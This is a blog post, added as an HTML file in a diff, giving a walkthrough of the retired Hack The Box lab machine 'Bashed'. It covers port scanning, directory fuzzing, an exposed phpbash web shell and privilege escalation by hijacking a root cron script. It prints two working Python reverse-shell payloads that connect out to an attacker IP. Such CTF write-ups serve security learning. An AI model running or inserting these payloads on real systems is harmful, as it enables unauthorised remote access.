@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author"
+    content="Samuel Adi">
+<meta name="description"
+    content="This post documents the complete walkthrough of Bashed, a retired vulnerable VM created by Arrexel, and hosted at Hack The Box. If you are uncomfortable with spoilers, please stop reading now.
+ Background Bashed is a retired vulnerable VM from Hack The Box.
+Information Gathering Let’s start with a masscan probe to establish the open ports in the host.
+# masscan -e tun0 -p0-65535,U:0-65535 10.10.10.68 --rate=5000 Starting masscan 1." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="/posts/2019/06/bashed-hack-the-box-walkthrough/" />
+
+
+<title>
+    
+    Bashed: Hack The Box Walkthrough :: Hello 
+    
+</title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.min.d90905eb29b71569a516566cd9662312bee9ab021c760de6949cdc92d6688be9.css">
+
+
+
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#252627">
+<link rel="shortcut icon" href="/favicon.ico">
+<meta name="theme-color" content="#252627">
+<meta itemprop="name" content="Bashed: Hack The Box Walkthrough">
+<meta itemprop="description" content="Bashed Write-up for Hack the Box">
+
+
+<meta itemprop="datePublished" content="2019-06-25T21:00:00&#43;07:00" />
+<meta itemprop="dateModified" content="2019-06-25T21:00:00&#43;07:00" />
+<meta itemprop="wordCount" content="832">
+
+
+
+<meta itemprop="keywords" content="Hack the box,Writeup," />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="/"/>
+
+<meta name="twitter:title" content="Bashed: Hack The Box Walkthrough"/>
+<meta name="twitter:description" content="Bashed Write-up for Hack the Box"/>
+
+
+
+
+<meta property="article:published_time" content="2019-06-25 21:00:00 &#43;0700 WIB" />
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text"># cat root.txt</span>
+            <span class="logo__cursor"></span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/about/">About</a></li><li><a href="/posts/">Posts</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>4 minutes
+
+            
+
+            </p>
+        </div>
+
+        <article>
+            <h1 class="post-title"><a href="/posts/2019/06/bashed-hack-the-box-walkthrough/">Bashed: Hack The Box Walkthrough</a></h1>
+
+            
+
+            <div class="post-content">
+                
+
+<p><img src="/img/bashed.jpg" alt="Bashed" /></p>
+
+<blockquote>
+<p>This post documents the complete walkthrough of Bashed, a retired vulnerable <a href="https://www.hackthebox.eu/home/machines/profile/118" target="_blank">VM</a> created by <a href="https://www.hackthebox.eu/home/users/profile/2904" target="_blank">Arrexel</a>, and hosted at <a href="https://www.hackthebox.eu/" target="_blank">Hack The Box</a>. If you are uncomfortable with spoilers, please stop reading now.</p>
+</blockquote>
+
+<h2 id="background">Background</h2>
+
+<p>Bashed is a retired vulnerable VM from Hack The Box.</p>
+
+<h2 id="information-gathering">Information Gathering</h2>
+
+<p>Let’s start with a <code>masscan</code> probe to establish the open ports in the host.</p>
+
+<pre><code># masscan -e tun0 -p0-65535,U:0-65535 10.10.10.68 --rate=5000
+
+Starting masscan 1.0.6 (http://bit.ly/14GZzcT) at 2019-06-25 13:58:18 GMT
+ -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+Initiating SYN Stealth Scan
+Scanning 1 hosts [131072 ports/host]
+Discovered open port 80/tcp on 10.10.10.68
+</code></pre>
+
+<p><code>masscan</code> only return one open port, which is port 80. Let&rsquo;s fire up our web browser and open the site.</p>
+
+<p><img src="/img/bashed_1.png" alt="index.html" /></p>
+
+<p>Interesting, there is one post here. Let&rsquo;s open it up</p>
+
+<p><img src="/img/bashed_2.png" alt="single.html" /></p>
+
+<p>Okay, let&rsquo;s try to enumerate the website more with <code>ffuf</code>.</p>
+
+<pre><code># ffuf -u http://10.10.10.68/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 100
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v0.11git
+________________________________________________
+
+ :: Method       : GET
+ :: URL          : http://10.10.10.68/FUZZ
+ :: Matcher      : Response status: 200,204,301,302,307,401,403
+________________________________________________
+
+.hta                    [Status: 403, Size: 290, Words: 22]
+.htpasswd               [Status: 403, Size: 295, Words: 22]
+.htaccess               [Status: 403, Size: 295, Words: 22]
+css                     [Status: 301, Size: 308, Words: 20]
+dev                     [Status: 301, Size: 308, Words: 20]
+fonts                   [Status: 301, Size: 310, Words: 20]
+images                  [Status: 301, Size: 311, Words: 20]
+index.html              [Status: 200, Size: 7742, Words: 2956]
+js                      [Status: 301, Size: 307, Words: 20]
+php                     [Status: 301, Size: 308, Words: 20]
+server-status           [Status: 403, Size: 299, Words: 22]
+uploads                 [Status: 301, Size: 312, Words: 20]
+:: Progress: [4594/4594] :: 208 req/sec :: Duration: [0:00:22] :: Errors: 0 ::
+</code></pre>
+
+<p>Great, now we know a some new endpoint and <code>/dev</code> looks really interesting. Let&rsquo;s open it up.</p>
+
+<p><img src="/img/bashed_3.png" alt="dev.html" /></p>
+
+<p>Bingo! The directory listing is enabled and <code>phpbash.php</code> look like something that have been mentioned before.</p>
+
+<p><img src="/img/bashed_4.png" alt="phpbash.html" /></p>
+
+<p><img src="/img/bashed_5.png" alt="phpbash.html" /></p>
+
+<p>Looks like <code>sudo -l</code> tells us that we can run any command as <code>scriptmanager</code>. But before that let&rsquo;s grab our <code>user.txt</code> file on Arraxel home folder, apparently the flag is world readable file.</p>
+
+<p><img src="/img/bashed_6.png" alt="user.txt" /></p>
+
+<h1 id="rooting-the-machine">Rooting the Machine.</h1>
+
+<p>Alright, so from our initial recon we can change into <code>scriptmanager</code> let&rsquo;s switch then!</p>
+
+<p><code>sudo -u scriptmanager python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p>
+
+<p>But, because we cannot run <code>sudo</code> from <code>phpbash.php</code> let&rsquo;s make some reverse shell using python</p>
+
+<p><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.45&quot;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);'</code></p>
+
+<p><img src="/img/bashed_7.png" alt="shell" /></p>
+
+<p>Alright, because now we got more stable shell let&rsquo;s run the previous <code>sudo</code> command.</p>
+
+<p><img src="/img/bashed_8.png" alt="switch_user" /></p>
+
+<p>After this, I actually run <code>LinEnum.sh</code> (not shown here) but I don&rsquo;t find something useful for me. But I found something interesting after doing <code>ls -la</code> on <code>/</code></p>
+
+<pre><code>/$ ls -la
+total 88
+drwxr-xr-x  23 root          root           4096 Dec  4  2017 .
+drwxr-xr-x  23 root          root           4096 Dec  4  2017 ..
+drwxr-xr-x   2 root          root           4096 Dec  4  2017 bin
+drwxr-xr-x   3 root          root           4096 Dec  4  2017 boot
+drwxr-xr-x  19 root          root           4240 Jun 23 16:40 dev
+drwxr-xr-x  89 root          root           4096 Dec  4  2017 etc
+drwxr-xr-x   4 root          root           4096 Dec  4  2017 home
+lrwxrwxrwx   1 root          root             32 Dec  4  2017 initrd.img -&gt; boot/initrd.img-4.4.0-62-generic
+drwxr-xr-x  19 root          root           4096 Dec  4  2017 lib
+drwxr-xr-x   2 root          root           4096 Dec  4  2017 lib64
+drwx------   2 root          root          16384 Dec  4  2017 lost+found
+drwxr-xr-x   4 root          root           4096 Dec  4  2017 media
+drwxr-xr-x   2 root          root           4096 Feb 15  2017 mnt
+drwxr-xr-x   2 root          root           4096 Dec  4  2017 opt
+dr-xr-xr-x 159 root          root              0 Jun 23 16:40 proc
+drwx------   3 root          root           4096 Dec  4  2017 root
+drwxr-xr-x  18 root          root            520 Jun 24 06:25 run
+drwxr-xr-x   2 root          root           4096 Dec  4  2017 sbin
+drwxrwxr--   2 scriptmanager scriptmanager  4096 Jun 25 06:50 scripts
+drwxr-xr-x   2 root          root           4096 Feb 15  2017 srv
+dr-xr-xr-x  13 root          root              0 Jun 25 06:20 sys
+drwxrwxrwt  10 root          root           4096 Jun 25 07:14 tmp
+drwxr-xr-x  10 root          root           4096 Dec  4  2017 usr
+drwxr-xr-x  12 root          root           4096 Dec  4  2017 var
+lrwxrwxrwx   1 root          root             29 Dec  4  2017 vmlinuz -&gt; boot/vmlinuz-4.4.0-62-generic
+</code></pre>
+
+<p>As we can see here, there is a folder named <code>scripts</code> and it is owned by <code>scriptmanager</code>. Let&rsquo;s take a look on that folder.</p>
+
+<pre><code>/scripts$ ls -la
+ls -la
+total 16
+drwxrwxr--  2 scriptmanager scriptmanager 4096 Jun 25 06:50 .
+drwxr-xr-x 23 root          root          4096 Dec  4  2017 ..
+-rw-r--r--  1 scriptmanager scriptmanager  216 Jun 25 06:53 test.py
+-rw-r--r--  1 root          root            12 Jun 25 06:50 test.txt
+</code></pre>
+
+<p>Alright, there is a python file and a text file. The text file is unique because it&rsquo;s owned by root. Down below is the content of <code>test.py</code></p>
+
+<pre><code>f = open(&quot;test.txt&quot;, &quot;w&quot;)
+f.write(&quot;testing 123!&quot;)
+f.close
+</code></pre>
+
+<p>Based on this code then my assumption is there is a cron job for <code>root</code> to run this script. Let&rsquo;s try changing the code into this</p>
+
+<pre><code>import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((&quot;10.10.14.45&quot;,31337))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;])
+</code></pre>
+
+<p><img src="/img/bashed_9.png" alt="switch_user" /></p>
+
+<p>And bingo! Got <code>root.txt</code>! 💃.</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+                <p>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="/tags/hack-the-box">Hack the box</a></span><span class="tag"><a href="/tags/writeup">Writeup</a></span>
+                </p>
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>832 Words</p>
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2019-06-25 21:00 &#43;0700</p>
+        </div>
+
+        
+            <div class="pagination">
+                <div class="pagination__title">
+                    <span class="pagination__title-h"></span>
+                    <hr />
+                </div>
+
+                <div class="pagination__buttons">
+                    
+
+                    
+                        <span class="button next">
+                            <a href="/posts/2019/06/blue-hack-the-box-walkthrough/">
+                                <span class="button__text">Blue: Hack The Box Walkthrough</span>
+                                <span class="button__icon">→</span>
+                            </a>
+                        </span>
+                    
+                </div>
+            </div>
+        
+
+        
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2019</span>
+	    <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
+            <span>Made with &#10084; by <a href="https://github.com/EasyNV">Samuel Adi</a></span>
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="/bundle.min.9e52e68b082cf2a30a7fead88260edb8818fbd7f7831e39674917d4539ec75df41ba88eaddfbd916594ab4fb2a31913b46cf2d6094cf80381edb8c632512a8ca.js" integrity="sha512-nlLmiwgs8qMKf&#43;rYgmDtuIGPvX94MeOWdJF9RTnsdd9Buojq3fvZFllKtPsqMZE7Rs8tYJTPgDge24xjJRKoyg=="></script>
+
+
+
+    </body>
+</html>
